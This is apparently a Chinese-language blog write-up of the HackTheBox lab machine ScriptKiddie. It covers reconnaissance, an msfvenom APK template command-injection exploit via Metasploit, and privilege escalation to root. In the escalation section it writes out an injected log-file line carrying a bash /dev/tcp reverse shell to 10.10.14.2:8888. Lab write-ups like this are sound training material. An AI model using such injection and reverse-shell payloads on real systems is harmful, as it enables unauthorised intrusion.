---
layout:     post
title:      HackTheBox ScriptKiddie
subtitle:   HackTheBox
date:       2021-06-03
author:     heria
header-img: img/post-bg-025.jpeg
catalog: true
tags:
---



![image-20210602135312485](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602135312485.png)

## 信息收集

```
nmap -sS -sV -sC 10.10.10.226
```

![image-20210602135220189](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602135220189.png)

查找Werkzeug对应漏洞并无发现

## 渗透

查看5000端口

![image-20210602135441749](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602135441749.png)

nmap 模块尝试扫描127.0.0.1，出现如下结果

![image-20210602135549231](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602135549231.png)

使用Google和exploit-db搜索该版本漏洞未发现可GetShell的漏洞。使用Google和exploit-db搜索venom漏洞发现APK模板命令注入漏洞

![image-20210602141451826](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602141451826.png)

提供了exp,但是msf下面也有相同的利用模块

![image-20210602145551516](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602145551516.png)

show options 设置下面的参数，exploit之后会生成一个apk文件

![image-20210602150625451](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602150625451.png)

之后kali开启监听，将apk文件上传

![image-20210602150806607](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602150806607.png)

能够接收到shell，此时通过以下语句开启交互模式

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![image-20210602150738425](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602150738425.png)

找到user.txt获取到第一个flag

![image-20210602151041741](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602151041741.png)



## 提权

在/etc/passwd下面找到另外一个可登录用户pwn

![image-20210602152814992](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602152814992.png)

之后在该用户目录下发现如下脚本

![image-20210602153832155](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602153832155.png)

该shell脚本未对hackers文件传入的内容做过滤，且/home/kid/logs/hackers文件当前用户kid可编辑，因此写入如下语句

```
echo "test  ;/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.2/8888 0>&1' #" >> hackers
```

脚本中语句会对该文件做处理，最终会拼接语句，达到利用的目的

![image-20210602165742018](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602165742018.png)

之后先开启8888端口，之后写入语句

![image-20210602164806081](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602164806081.png)

拿到pwn的shell，sudo -l查看可执行的命令

![image-20210602164748123](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602164748123.png)

直接执行，运行msf

```
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

![image-20210602164530024](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602164530024.png)

找到root.txt 拿到第二个flag

![image-20210602164708184](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210602164708184.png)

